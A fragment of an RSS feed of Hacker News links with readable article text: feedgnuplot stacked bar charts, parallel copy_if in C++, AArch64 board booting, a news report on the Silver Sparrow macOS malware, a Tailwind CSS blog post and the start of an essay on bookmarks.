<p><img src="http://notes.secretsauce.net/notes/2021/02/22_feedgnuplot-labelled-bar-charts-and-a-guide/xticlabels-clustered.svg" alt="xticlabels-clustered.svg" width="90%">
</p>

<p>
Or we can stack the bars on top of one another:
</p>

<div>

<pre><span>echo</span> <span>"# x label a b</span>
<span>        5 aaa   2 1</span>
<span>        6 bbb   3 2</span>
<span>       10 ccc   5 4</span>
<span>       11 ddd   2 1"</span> | <span>\</span>
vnl-filter -p label,a,b | <span>\</span>
feedgnuplot --vnl <span>\</span>
            --xticlabels <span>\</span>
            --set <span>'style data histogram'</span> <span>\</span>
            --set <span>'style histogram rowstacked'</span> <span>\</span>
            --set <span>'boxwidth 0.8'</span> <span>\</span>
            --set <span>'style fill solid border lt -1'</span> <span>\</span>
            --autolegend <span>\</span>
            --ymin 0 --unset grid
</pre>
</div>


<p><img src="http://notes.secretsauce.net/notes/2021/02/22_feedgnuplot-labelled-bar-charts-and-a-guide/xticlabels-stacked.svg" alt="xticlabels-stacked.svg" width="90%">
</p>

<p>
This is <code>gnuplot</code>'s "row stacking". It also supports "column stacking", which
effectively transposes the data, and it's not obvious to me that makes sense in
the context of <code>feedgnuplot</code>. Similarly, it can label <code>y</code> and/or <code>z</code> axes; I
can't think of a specific use case, so I don't have a realistic usage in mind,
and I don't support that yet. If anybody can think of a use case, email me.
</p>

<p>
Notes and limitations:
</p>

<ul>
<li>Since with <code>--domain</code> you can pass in both an <code>x</code> value <i>and</i> a tic label, it
is possible to give it conflicting tic labels for the same <code>x</code> value.
<code>gnuplot</code> itself has this problem too, and it just takes the last label it has
for a given <code>x</code>. This is probably good-enough.
</li>

<li><code>feedgnuplot</code> uses whitespace-separated columns with no escape mechanism, so
the field labels cannot have whitespace in it. Fixing this is probably not
worth the effort.
</li>

<li>These tic labels do not count towards the <code>tuplesize</code>
</li>

<li>I really need to add a similar feature to <a href="https://github.com/dkogan/gnuplotlib"><code>gnuplotlib</code></a>. This will happen when
I need it or when somebody asks for it, whichever comes first.
</li>
</ul>
</div></div>]]>
            </description>
            <link>http://notes.secretsauce.net/notes/2021/02/22_feedgnuplot-labelled-bar-charts-and-a-guide.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26234157</guid>
            <pubDate>Tue, 23 Feb 2021 05:41:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Implementing Parallel Copy_If in C++]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26234154">thread link</a>) | @todsacerdoti
<br/>
February 22, 2021 | https://www.cppstories.com/2021/par-copyif/ | <a href="https://web.archive.org/web/*/https://www.cppstories.com/2021/par-copyif/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p><img src="https://www.cppstories.com/2021/images/parfilter.png" alt=""></p>  
          
        

<p>In a blog post about a dozen ways to filter elements, I mentioned only serial versions of the code. But how about leveraging concurrency? Maybe we can throw some more threads and async tasks and complete the copy faster?</p>

<p>For example, I have 6 cores on my machine, so it would be nice to see, like 5x speedup over the sequential copy?</p>

<p>In C++17 we have parallel algorithms, so let’s try calling <code>std::copy_if</code> with <code>std::execution::par</code>.</p>

<p>If we go to the implementation of <code>std::copy_if</code> in the MSVC libraries, the parallel version we can see the following:</p>

<pre><code>// VS 2019 16.8
// not parallelized at present, parallelism expected to be feasible in a future release
_REQUIRE_PARALLEL_ITERATOR(_FwdIt1);
_REQUIRE_PARALLEL_ITERATOR(_FwdIt2);
return _STD copy_if(_First, _Last, _Dest, _Pass_fn(_Pred));
</code></pre>

<p>That’s why it’s time to write my version :)</p>

<p>Disclaimer: those are only my experiments (mostly to learn something); if you want to use it in your projects, then please measure, measure and measure :)</p>

<h2 id="the-basics">The Basics</h2>

<p>In a basic form C++17’s parallel algorithms are very simple to enable. Just pass a <code>std::execution::par</code> and you’re done! For example:</p>

<pre><code>std::sort(std::execution::par, ...);
std::for_each(std::execution::par, ...);
</code></pre>

<p>The code invokes a bunch of threads (possibly leveraging some existing thread pool) and will kick smaller tasks in batches on multiple threads.</p>

<p>We should keep in mind that such invocation will always generate more work than the sequential version! And the cost of preparation, setting up the batches, kicking off thread pool, synchronisation - that adds a visible cost to the whole processing.</p>

<p>Ideally running things in parallel works best for lots of objects and also when small tasks are separate. A perfect example:</p>

<pre><code>std::vector&lt;double&gt; numbers(SOME_BIG_COUNT);
std::for_each(std::execution::par, begin(numbers), end(numbers), [](double&amp; d){
    d = complexComputation(); // no dependency here
});
</code></pre>

<p>You can read my previous experiments with parallel algorithms:</p>

<ul>
<li><a href="https://www.cppstories.com/2018/11/parallel-alg-perf/">The Amazing Performance of C++17 Parallel Algorithms, is it Possible? - C++ Stories</a>

<ul>
<li>In the articles, I showed some “real” use cases with Fresnel and 3D Vectors and got speedup almost linear to the number of cores in my system.</li>
</ul></li>
<li><a href="https://www.cppstories.com/2018/11/pstl/">How to Boost Performance with Intel Parallel STL and C++17 Parallel Algorithms - C++ Stories</a></li>
</ul>

<p>On the other case with code like:</p>

<pre><code>std::sort(std::execution::par, begin(numbers), end(numbers));
</code></pre>

<p>You’ll see some speedup (when you have a large number of objects), but it won’t be linear to the numbers of cores.</p>

<p>This is because <code>sort</code> needs to shuffle things around in a container, and to do it safely, the algorithm has to perform some synchronisation so that other threads see the correct results.</p>

<h2 id="benchmark-code">Benchmark Code</h2>

<p>For our tests (apart from simple debug output), I’ll be using the following code.</p>

<pre><code>const size_t VEC_SIZE = argc &gt; 1 ? atoi(argv[1]) : 10;

std::vector&lt;std::pair&lt;double, double&gt;&gt; testVec(VEC_SIZE);
    std::ranges::generate(testVec.begin(), testVec.end(), []() mutable {
        return std::pair{ GenRandom(-10.0, 10.0), GenRandom(-10.0, 10.0) };
    });

auto test = [](auto&amp; elem) {
    auto sn = sin(elem.first) * cos(elem.second + 10.0);
    return sn &gt; 0.0;
};
</code></pre>

<p>In general, I’d like to have a bit more computation than <code>elem%2 == 0</code>. What’s more, each element is 16 bytes, so the object is also not super small.</p>

<h2 id="the-naïve-approach">The Naïve Approach</h2>

<p>Similarly to <code>std::sort</code> our <code>filter/copy_if</code> function is not trivial to parallelise.</p>

<p>We can think about it in the following way:</p>

<ul>
<li>we have to run a predicate function on all elements - in most cases, it doesn’t depend on other elements and can be best to perform on many threads</li>
<li>but then we have to put matching elements in the new container. This is a variable step and requires some synchronisation among threads.</li>
</ul>

<p>For a start it’s good to implement a brute force approach and learn from that:</p>

<pre><code>template &lt;typename T, typename Pred&gt;
auto FilterCopyIfParNaive(const std::vector&lt;T&gt;&amp; vec, Pred p) {
    std::vector&lt;T&gt; out;
    std::mutex mut;
    std::for_each(std::execution::par, begin(vec), end(vec),
        [&amp;out, &amp;mut, p](auto&amp;&amp; elem) {
            if (p(elem)) {
                std::unique_lock lock(mut);
                out.push_back(elem);
            }
        });

    return out;
}
</code></pre>

<p>How does it work?</p>

<p>We run all steps in parallel, thanks to <code>std::for_each</code> and <code>std::execution::par</code>, but then we need to synchronise when we want to put the element in the output container.</p>

<p>As you can notice, all operations that modify the state of the container has to be protected.</p>

<p>Let’s see the performance:</p>

<pre><code>// 4 cores / 8 threads
benchmark vec size: 100000
transform only seq          : 2.5878 ms, ret: 100000
transform only par          : 1.3734 ms, ret: 100000
FilterCopyIf                : 5.3675 ms, ret: 50203
FilterCopyIfParNaive        : 9.1836 ms, ret: 50203
</code></pre>

<p>And on my 6 core:</p>

<pre><code>// 6 cores / 12 threads
benchmark vec size: 100000
transform only seq          : 2.223 ms, ret: 100000
transform only par          : 0.5507 ms, ret: 100000
FilterCopyIf                : 3.851 ms, ret: 50203
FilterCopyIfParNaive        : 10.1295 ms, ret: 50203
</code></pre>

<p>Upps… only ~2 or 3 times slower :) (I compare <code>FilterCopyIf</code> against <code>FilterCopyIfNaive</code>).</p>

<p>For comparison I also included <code>transform only seq</code> and <code>transform only par</code> which is just a simple transform run over the collection:</p>

<pre><code>std::vector&lt;uint8_t&gt; buffer(testVec.size());

RunAndMeasure("transform only seq          ", [&amp;testVec, &amp;buffer, &amp;test]() {
    std::transform(begin(testVec), end(testVec), begin(buffer), test);
    return buffer.size();
});

RunAndMeasure("transform only par          ", [&amp;testVec, &amp;buffer, &amp;test]() {
    std::transform(std::execution::par, begin(testVec), end(testVec), begin(buffer), test);
    return buffer.size();
});
</code></pre>

<p>Please notice that <code>buffer</code> is created outside the transform lambda, so we don’t pay the price for its initialisation. See how it nicely scales with many cores.</p>

<h2 id="compose-algorithms">Compose Algorithms</h2>

<p>What else can we do?</p>

<p>I suggest the composition of several algorithms:</p>

<ul>
<li>Run <code>std::transform</code> on all input elements to compute the predicate function, store the boolean result in a temporary container.</li>
<li>Then we need to compute the final position of the matching elements - this can be done by invoking <code>std::exlusive_scan</code></li>
<li>Later, we need to create the final results and merge the computed values.</li>
</ul>

<p>See the illustration:</p>

<p><img src="https://www.cppstories.com/2021/images/par_compose_copy.png" alt=""></p>

<p>Here’s the code</p>

<pre><code>template &lt;typename T, typename Pred&gt;
auto FilterCopyIfParCompose(const std::vector&lt;T&gt;&amp; vec, Pred p) {
    std::vector&lt;uint8_t&gt; buffer(vec.size());
    std::vector&lt;uint32_t&gt; idx(vec.size());
    std::transform(std::execution::par, begin(vec), end(vec), begin(buffer), 
         [&amp;p](const T&amp; elem) {
            return p(elem);
    });

    std::exclusive_scan(std::execution::par, 
                        begin(buffer), end(buffer), begin(idx), 0);

    std::vector&lt;T&gt; out(idx.back()+1);
    std::vector&lt;size_t&gt; indexes(vec.size());
    std::iota(indexes.begin(), indexes.end(), 0);

    std::for_each(std::execution::par, begin(indexes), end(indexes), 
                  [&amp;buffer, &amp;vec, &amp;idx, &amp;out](size_t i) {
        if (buffer[i])
            out[idx[i]] = vec[i];
    });

    return out;
}
</code></pre>

<p>output from a sample execution:</p>

<pre><code>input   : 0, 1, 1, 0, 1, 1, 0, 1, 1, 1
buffer  : 0, 1, 1, 0, 1, 1, 0, 1, 1, 1
idx     : 0, 0, 1, 2, 2, 3, 4, 4, 5, 6
out     : 1, 2, 4, 5, 7, 8, 9
</code></pre>

<p>Woh, woh… but this is so much code now! Can this even work?</p>

<p>So… yes, it works, and in some cases, it will be faster than the sequential version.</p>

<p>Here are the main caveats:</p>

<ul>
<li>The code adds substantially more work</li>
<li>We use additional buffers and containers, so we need more memory.</li>
</ul>

<h3 id="benchmark">Benchmark</h3>

<p>Let’s have a test run. Can this be faster than the sequential version?</p>

<pre><code>// 4 cores / 8 threads
benchmark vec size: 100000
transform only seq          : 2.5878 ms, ret: 100000
transform only par          : 1.3734 ms, ret: 100000
FilterCopyIf                : 5.3675 ms, ret: 50203
FilterCopyIfParNaive        : 9.1836 ms, ret: 50203
FilterCopyIfParCompose      : 3.03 ms, ret: 50203
FilterCopyIfParComposeSeq   : 2.3454 ms, ret: 50203
FilterCopyIfParTransformPush: 2.5735 ms, ret: 50203 
</code></pre>

<p>And for 6 cores:</p>

<pre><code>// 6 cores / 12 threads
benchmark vec size: 100000
transform only seq          : 2.3379 ms, ret: 100000
transform only par          : 0.5979 ms, ret: 100000
FilterCopyIf                : 3.675 ms, ret: 50203
FilterCopyIfParNaive        : 10.0073 ms, ret: 50203
FilterCopyIfParCompose      : 1.2936 ms, ret: 50203
FilterCopyIfParComposeSeq   : 1.0754 ms, ret: 50203
FilterCopyIfParTransformPush: 2.0103 ms, ret: 50203
</code></pre>

<p><code>FilterCopyIfParComposeSeq</code> - is a version of <code>FilterCopyIfParCompose</code> with a simple loop to copy the results:</p>

<pre><code>for (size_t i = 0; i &lt; vec.size(); ++i)
    if (buffer[i])
        out[idx[i]] = vec[i];
</code></pre>

<p>And <code>FilterCopyIfParTransformPush</code> is another variation where we have only <code>std::transform</code> to be run in parallel, and then we use regular <code>push_back</code>.</p>

<pre><code>template &lt;typename T, typename Pred&gt;
auto FilterCopyIfParTransformPush(const std::vector&lt;T&gt;&amp; vec, Pred p) {
    std::vector&lt;uint8_t&gt; buffer(vec.size());
    std::transform(std::execution::par, 
                   begin(vec), end(vec), begin(buffer), 
                   [&amp;p](const T&amp; elem) {return p(elem); }
    );

    std::vector&lt;T&gt; out;

    for (size_t i = 0; i &lt; vec.size(); ++i)
        if (buffer[i])
            out.push_back(vec[i]);

    return out;
}
</code></pre>

<p>But we can see that this version is 2x faster than the sequential! (for 4 cores) and 3x faster for 6 cores! So it’s a promising approach.</p>

<h2 id="blocks">Blocks</h2>

<p>Let’s try another approach.</p>

<p>This time we’ll split work into smaller chunks and then call <code>copy_if</code> separately:</p>

<pre><code>template &lt;typename T, typename Pred&gt;
auto FilterCopyIfParChunks(const std::vector&lt;T&gt;&amp; vec, Pred p) {
    const auto chunks = std::thread::hardware_concurrency();
    const auto chunkLen = vec.size() / chunks;
    std::vector&lt;size_t&gt; indexes(chunks);
    std::iota(indexes.begin(), indexes.end(), 0);

    std::vector&lt;std::vect…</code></pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.cppstories.com/2021/par-copyif/">https://www.cppstories.com/2021/par-copyif/</a></em></p>]]>
            </description>
            <link>https://www.cppstories.com/2021/par-copyif/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26234154</guid>
            <pubDate>Tue, 23 Feb 2021 05:40:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[AArch64 Boards and Perception]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26233981">thread link</a>) | @zdw
<br/>
February 22, 2021 | https://marcin.juszkiewicz.com.pl/2021/02/22/aarch64-boards-and-perception/ | <a href="https://web.archive.org/web/*/https://marcin.juszkiewicz.com.pl/2021/02/22/aarch64-boards-and-perception/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p>Recently I had a discussion with A13 and realized that people may have
different perception of how AArch64 boards&nbsp;work:</p>
<blockquote>
<p>Sahaj told me that you can just install generic images on&nbsp;honeycomb</p>
<p>it kinda blows my&nbsp;mind</p>
</blockquote>
<p>How did we got to that&nbsp;point?</p>
<h3>Servers are boring,&nbsp;right?</h3>
<p>I started working on AArch64 in 2012. First in fast models written by Arm
developers, then also in <span>QEMU</span>. Both used direct kernel boot method without any
firmware or&nbsp;bootloaders.</p>
<p>In 2013 I moved from Canonical/Linaro to Red Hat. And there we got server from
Applied Micro. I do not remember how it booted as I used it for building
software. Some time later we had Mustangs and all of them were booting <span>UEFI</span>.</p>
<p>Then <a href="https://marcin.juszkiewicz.com.pl/2014/06/10/aarch64-is-in-the-house/">I got Mustang at home</a>. 
Fedora, <span>RHEL</span> were booting fine. Then CentOS and Debian joined. All of them
used grub-efi like my x86-64 desktop or&nbsp;laptop.</p>
<p>Time passed, I got other servers to work with. HPe M400, ThunderX, ThunderX2,
Falkor, D05 etc. Each of them was running <span>UEFI</span>. Either Tianocore based or
commercial&nbsp;one.</p>
<p>And to install operating system all I needed was to boot generic install&nbsp;media.</p>
<h3><span>SBC</span>&nbsp;hell</h3>
<p>At same time <span>SBC</span> world was fighting with users. Each vendor/SoC/board had to be
treated specially as there was no way to store firmware on board (as <a href="https://marcin.juszkiewicz.com.pl/2020/01/29/the-most-expensive-chip-in-the-arm-world/"><span>SPI</span> flash is
very expensive</a>).</p>
<p>So depending on <span>SBC</span> your firmware could be written&nbsp;either:</p>
<ul>
<li>at some special offset from start of microSD&nbsp;card</li>
<li>at the beginning of a partition of special&nbsp;type</li>
<li>in a file on vfat partition of any&nbsp;type</li>
<li>in a file on <span>EFI</span> System Partition (also using&nbsp;vfat)</li>
</ul>
<p>Some offsets forced the use of “obsolete” <span>MBR</span> partitioning as there was no space
for <span>GPT</span> information. While <span>UEFI</span> systems require <span>GPT</span> not <span>MBR</span>.</p>
<p>It also generated lot of wrong information like “this file needs to be named in
<span>UPPERCASE</span> (on case insensitive filesystem)” or “needs to be first file written
to a partition”. Some kind of “<span>SBC</span> boot&nbsp;voodoo”.</p>
<p>So each <span>SBC</span> required its own boot media — you could not take it to a board with
some other SoC and expect it to start. Or you spend some time to create some
kind of hybrid image which had a few bootloaders written. Easier way was to
prepare a separate boot media images per <span>SBC</span>.</p>
<p>From time to time there was <span>SBC</span> with onboard flash available for storing
firmware. Some people made use of it, others continued doing offset crap as they
were used to&nbsp;it.</p>
<h3><span>SBBR</span>, <span>EBBR</span>&nbsp;came</h3>
<p>Last years brought us several specifications from Arm. First was <span>SBBR</span> which
stands for Server Base Boot Requirements. It said which features should be
present in firmware (you can read more in <a href="https://marcin.juszkiewicz.com.pl/2020/10/12/standards-in-arm-space-part-i/">my previous post about Arm
standards</a>).</p>
<p>As SBCs are not servers, a new specification was created for them: <span>EBBR</span> (E means
Embedded). It basically says “try to follow what server does” and has some
requirements either dropped or&nbsp;relaxed.</p>
<p>Both were designed to make distribution’s life easier. Never mind is it <span>BSD</span>,
Linux or Microsoft Windows — they have to put <span>EFI</span> bootloader (like Grub-efi) in
<span>EFI</span> System Partition and system will boot on any supported <span>SBBR</span>/<span>EBBR</span>&nbsp;hardware.</p>
<p>For example I have a <span>USB</span> pendrive with Debian “bullseye” installed. It boots
fine on RockPro64 and Espressobin SBCs (both have <span>EBBR</span> compliant U-Boot stored
in on-board flash) and on Mustang and HoneyComb (both with <span>SBBR</span> compliant <span>UEFI</span>
in on-board&nbsp;flash).</p>
<h3>Habits. Good, bad,&nbsp;forced.</h3>
<p>So it looks like the way how AArch64 system should boot depends on what your
habits&nbsp;are.</p>
<p>When you started from servers then <span>SBBR</span>/<span>EBBR</span> way is your way and you look weird
at most of <span>SBC</span> systems with their offsets and “other mumbo&nbsp;jumbo”.</p>
<p>If all you used were <span>SBC</span> then going into <span>SBBR</span>/<span>EBBR</span> world can be “zOMG, it just
magically&nbsp;works!”.</p>
<h3>Note to <span>SBC</span>&nbsp;vendors</h3>
<p>Most SBCs already follow the <span>EBBR</span> standard or can easily be made compliant.
Never mind you are using mainline U-Boot or some own fork (and then consider
upstreaming as board’s life may be longer than you&nbsp;expect).</p>
<p>Enable the CONFIG_DISTRO_DEFAULTS option in the config. Build U-Boot, store it
to the board and boot. Then erase whatever environment you used before with “env
default -a”&nbsp;command.</p>
<p>On next reboot your <span>SBC</span> will iterate over “boot_targets” variable and check
for few standard boot&nbsp;files:</p>
<ul>
<li>extlinux/extlinux.conf</li>
<li>boot.scr.uimg</li>
<li>boot.scr</li>
<li>/efi/boot/bootaa64.efi</li>
</ul>
<p>When it gets something then it handles that and boots. If not then goes to
another boot&nbsp;target.</p>
<p>This allows to handle basically every operating system used on Arm systems.
And allows to boot generic install <span>ISO</span> (as long as <span>OS</span> on it supports the&nbsp;device).</p>
<p>Bonus points if your <span>SBC</span> has some on board flash or eMMC it can boot from. Then
firmware can be stored there so user does not even have to worry about&nbsp;it.</p>
	</div></div>]]>
            </description>
            <link>https://marcin.juszkiewicz.com.pl/2021/02/22/aarch64-boards-and-perception/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26233981</guid>
            <pubDate>Tue, 23 Feb 2021 05:03:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Over 30k Apple Macs have been infected with a high-stealth malware]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26233898">thread link</a>) | @sidcool
<br/>
February 22, 2021 | https://www.businessinsider.in/tech/news/over-30000-apple-macs-have-been-infected-with-a-high-stealth-malware-and-the-company-has-no-idea-why/articleshow/81145708.cms | <a href="https://web.archive.org/web/*/https://www.businessinsider.in/tech/news/over-30000-apple-macs-have-been-infected-with-a-high-stealth-malware-and-the-company-has-no-idea-why/articleshow/81145708.cms">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div id="datatxt81145708read"><div data-den="denmark"><div><p>San Francisco, </p><keyword keytype="person" smid="0" usetype="2" keywordseo="Security-researchers" actualkeyword="Security researchers">Security researchers</keyword><p> have discovered a </p><keyword keytype="UnKnown" smid="0" usetype="2" keywordseo="mysterious-malware" actualkeyword="mysterious malware">mysterious malware</keyword><p> on nearly 30,000 </p><keyword keytype="Company" smid="0" usetype="2" keywordseo="Apple" keynameseo="apple" actualkeyword="apple">Apple</keyword><p> Macs and they have no </p><keyword keytype="City" smid="0" usetype="2" keywordseo="idea" actualkeyword="idea">idea</keyword><p> what this is for and how is this virus going to infected the devices.
</p><p>
The malware named 'Silver Sparrow' comes with a mechanism to self-destruct itself, a capability that's typically reserved for high-stealth operations. 
</p><p>
    "So far, though, there are no signs the self-destruct feature has been used, raising the question of why the mechanism exists," Ars Technica first reported about the presence of malware citing security researchers.
</p><p>The lack of a final payload suggests that the malware may spring into action anytime.
</p><p>
    The malware has been found in 153 countries with heavy detection reported in the US, the UK, Canada, France and </p><keyword keytype="Location" smid="0" usetype="2" keywordseo="Germany" actualkeyword="Germany">Germany</keyword><p>. 
</p><p>
Silver Sparrow is an activity cluster that includes a binary compiled to run on Apple's new M1 chips but lacks one very important feature: a payload.
</p><p><span>Advertisement</span></p><figure><div></div></figure><hr><p>"Though we haven't observed Silver Sparrow delivering additional malicious payloads yet, its forward-looking M1 chip compatibility, global reach, relatively high infection rate, and operational maturity suggest Silver Sparrow is a reasonably serious threat," according to researchers from cyber security firm Red Canary.
</p><p>
The malware is uniquely positioned to deliver a potentially impactful payload at a moment's notice. 
</p><p>
    Silver Sparrow comes in two versions — one with a binary in mach-object format compiled for </p><keyword keytype="Company" smid="0" usetype="2" keywordseo="Intel" actualkeyword="Intel">Intel</keyword><p> x86_64 processors and the other Mach-O binary for the M1. 
</p><p>Researchers have earlier warned that Apple's transition from Intel to its own silicon M1 chip may make it easy for hackers to introduce malware.
</p><p>
    "To me, the most notable [thing] is that it was found on almost 30K macOS endpoints... and these are only endpoints the </p><keyword keytype="Company" smid="0" usetype="2" keywordseo="MalwareBytes" keynameseo="malwarebytes" actualkeyword="malwarebytes">MalwareBytes</keyword><p> can see, so the number is likely way higher," said Patrick Wardle, a macOS security expert.
</p><p>


<strong>SEE ALSO:<br><a href="https://www.businessinsider.in/stock-market/news/how-to-check-railtel-ipo-share-allotment-status-online/articleshow/81145120.cms">Indian Railways owned RailTel’s IPO: Here’s how to check share allotment status</a><br><a href="https://www.businessinsider.in/tech/news/india-needs-chipset-manufacturers-lots-of-them-here-is-why-/articleshow/81137745.cms">India needs chipset manufacturers — lots of them. Here is why</a><br><a href="https://www.businessinsider.in/stock-market/news/nurecas-100-crore-ipo-heres-how-to-check-share-allotment-status/articleshow/81135236.cms">Nureca’s ₹100 crore IPO: Here’s how to check share allotment status</a><br></strong>
<a href="https://www.businessinsider.in/travel/article/exploring-the-unreal-beauty-of-the-andaman-islands/articleshow/81126293.cms">Exploring the unreal beauty of the Andaman Islands</a></p>
</div></div></div></div></div>]]>
            </description>
            <link>https://www.businessinsider.in/tech/news/over-30000-apple-macs-have-been-infected-with-a-high-stealth-malware-and-the-company-has-no-idea-why/articleshow/81145708.cms</link>
            <guid isPermaLink="false">hacker-news-small-sites-26233898</guid>
            <pubDate>Tue, 23 Feb 2021 04:43:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[We Love Tailwind]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26233448">thread link</a>) | @flancrest
<br/>
February 22, 2021 | https://formcake.com/blog/why-we-love-tailwind | <a href="https://web.archive.org/web/*/https://formcake.com/blog/why-we-love-tailwind">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-v-e7750592=""><p><a href="https://tailwindcss.com/">Tailwind CSS</a> is a CSS framework of composable HTML utility functions and it's <em>great</em>. It favors markup-heavy design with little-to-nothing in the way of stylesheets.</p>
<p>Here's an example of it in action - our link styling.</p>
<p>This is what the markup looks like:</p>
<pre><code>&lt;a class="c-link" href="/blog"&gt;Our Blog&lt;/a&gt;</code></pre>

<p>Now here's the relevant section of <code>tailwind.css</code>:</p>
<pre><code>.c-link {
    @apply text-primary-highlight;
}

.c-link:hover {
    @apply underline;
}</code></pre>

<p>Simple, concise, powerful - there are so many things that make this and the rest of Tailwind great. Here are a few of them.</p>
<h2 id="standardization-and-theming">Standardization and Theming</h2>
<p>The ability to theme (e.g. <code>text-primary-highlight</code>) gives Tailwind a powerful consistency, but one of its killer realizations of standardization comes in the way it envisions spacing.</p>
<p>With padding (<code>p-1</code>) and margin (<code>m-1</code>) denominated with a simple unit range, available in combinations like padding-top (<code>pt-1</code>), margin top and bottom spacing (<code>my-1</code>), etc, with tailwind you can dedicate yourself to a few common sizes (say 2, 4, 6) use them in a reasonable way, and achieved the desired effect of visual balance. The system obviously depends on you exercising a certain amount of discipline, but it's a big improvement on just shooting from the hip with random space values (<code>12px</code>? <code>1.25rem</code>? Sure). It puts layout in the UI on rails.</p>
<h2 id="composability">Composability</h2>
<p>Because classes in Tailwind can be used together in any combination, you can do things like abstract the design of an element into a component via <code>@apply</code>, (for example, our link component) then add the spacing (e.g. <code>mt-1</code>, <code>p-2</code>, etc) in the individual markup element, separating out the layout and design code.</p>
<h2 id="semantic-value">Semantic Value</h2>
<p>Tailwind does a great job of using consistent structures for classes. Padding, margin, width, height - everything with some kind of space value - uses the same spread of unit values. Tailwind makes it easy to guess what a given utility class <em>should</em> be, given a rational naming system, which just makes you as a developer that much more productive.</p>
<p>This also addresses one of the biggest criticisms of Tailwind, that it's "just another DSL" adding a layer of complexity and buggy cruftiness between you and what should be pure, sweet markup. <em>Why not do this all in straight CSS, wouldn't it be simpler?</em></p>
<p>But because the way the public API in Tailwind is laid out makes it easy to comprehend and make guesses about, there's less you need to straight up memorize, and you become comfortable using it quickly.</p>

<p>One side-effect of making the Tailwind utilities composable is that you get a long "recipe" of all the classes that make up a particular design element. Pair with this with an active community of developers (they love their tools!) and continuing support from the original creators of Tailwind via their new library of paid Tailwind components, <a href="https://tailwindui.com/">Tailwind UI</a> and it's exceedingly easy to use a few community-sourced features as a starter and evolve them to suit your particular needs</p>
<p>Even the design of Tailwind itself is more conducive to community - passing around CSS snippets is awkward. You have to make sure the selectors are applied correctly and the CSS itself put in the right place to make sure that the right rules win out. But with Tailwind, just copy the class string from a given HTML component, add it to yours, and you're done. It makes it much easier to share small, component-level snippets.</p>
<p>These are just some of the reasons we've taken a shine to Tailwind, but the strongest thing we can say in its favor is that it's accelerated our frontend development. Tailwind delivers on its promise to wrap small, essential blocks of design and layout logic into their own standardized, bit-sized HTML classes, and in so doing empower developers to haggle less with their CSS spacing and instead just get on with the business of bootstrapping a prototype quickly.</p>
</div></div>]]>
            </description>
            <link>https://formcake.com/blog/why-we-love-tailwind</link>
            <guid isPermaLink="false">hacker-news-small-sites-26233448</guid>
            <pubDate>Tue, 23 Feb 2021 03:09:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[On Bookmarks and Note Taking (2020)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26233405">thread link</a>) | @bariumbitmap
<br/>
February 22, 2021 | https://chrisman.github.io/11.html | <a href="https://web.archive.org/web/*/https://chrisman.github.io/11.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>
I am moving my collection of links from a naive bookmarking system to a more intentional centralized knowledge base.
</p>
<p>
2020-07-07
</p>
<h2 id="contents">Contents</h2>
<ol type="1">
<li>A Personal History</li>
<li>A Fractured Landscape</li>
<li>Bookmarking: Why Even Do A Thing?</li>
<li>More On Type 2 Bookmarks</li>
<li>Deplatforming my bookmarks</li>
<li>Conclusion</li>
<li>Resources</li>
</ol>
<h2 id="a-personal-history">A Personal History</h2>
<p>The happiest I’ve ever been with my bookmarks was when I used <a href="https://en.wikipedia.org/wiki/Delicious_(website)">del.icio.us</a> back in the aughts. The things I liked about it best are:</p>
<ol type="1">
<li><p>Simplicity: It worked via a bookmarklet.</p></li>
<li><p>Organization: I could tag bookmarks, and organize tags into categories of tags, and</p></li>
<li><p>Sharing: I could easily share a tag or group of tags with a friend or collaborator.</p></li>
</ol>
<p>I remembering seeing, I think it was Warren Ellis’s collection of tags and bundles on del.icio.us around this time, and it was an astounding collection of research.</p>
<p>Nothing I’ve used since then has been as good at organization and exporting/sharing.</p>
<p>I started using <a href="https://en.wikipedia.org/wiki/Pocket_(service)">Pocket</a> probably also in the aughts, back when it was still Read It Later, and have consistently been just sorta content with it. There’s no good way to share tags or groups of tags, and there’s no kind of meta-organizing of tags. But it allows me to save stuff to read and reference later.</p>
<p>It is the minimally viable bookmarking product. And now it is owned by Mozilla and for some reason it is also part of Firefox, so it’s constantly available. (Even though I use the service myself, I go back and forth between feeling like this integration is convenient, and like it is being shoved in my face.)</p>
<p>I know there are other products out there. Especially <a href="http://pinboard.in/t">pinboard</a>, which I think might be the holy grail of bookmarking for me, but I haven’t yet been willing to shell out $$$ for a subscription to a service that offers no trial.</p>
<h2 id="a-fractured-landscape">A Fractured Landscape</h2>
<p>The other problem with bookmarks is that it is really, really hard for me to commit to keeping them all in one place while so many sites offer their own “save” functions.</p>
<p>Many of my bookmarks remain in the form of saved comments and posts on reddit, saved links on lobste.rs and hackernews, saved videos and playlists on youtube, favorited posts on twitter and mastodon, “starred” content in my rss reader, etc. So trying to find “saved” content later often means visiting all those sites and more looking for where I saved the damn thing. Sometimes they’re saved for some reason in my browser bookmarks, which is the least flexible way to save bookmarks.</p>
<h2 id="bookmarking-why-even-do-a-thing">Bookmarking: Why Even Do A Thing?</h2>
<p>Why bookmark things?</p>
<p>From on my own experiences, there are two primary reasons:</p>
<ol type="1">
